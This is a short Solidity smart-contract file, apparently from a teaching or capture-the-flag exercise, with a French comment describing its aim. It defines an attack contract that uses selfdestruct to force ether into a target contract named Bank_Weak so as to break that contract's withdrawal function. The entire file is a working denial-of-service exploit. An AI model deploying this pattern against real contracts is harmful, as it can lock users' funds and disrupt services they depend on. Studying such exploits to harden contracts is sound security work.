// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.2;

import "./Bank_Weak.sol";
 
/** @dev Ce contrat d'attaque a pour but de d'envoyer des eth de manière forcée sur le contrat attaqué afin de bloquer sa fonction de retrait
*/
contract Bank_Hack {
    Bank_Weak contract_attacked;

    constructor(address _contractVaultAddress) payable {
        contract_attacked = Bank_Weak(_contractVaultAddress);
    }
 
    function attack() public payable {
        selfdestruct(payable(address(contract_attacked)));
    }

}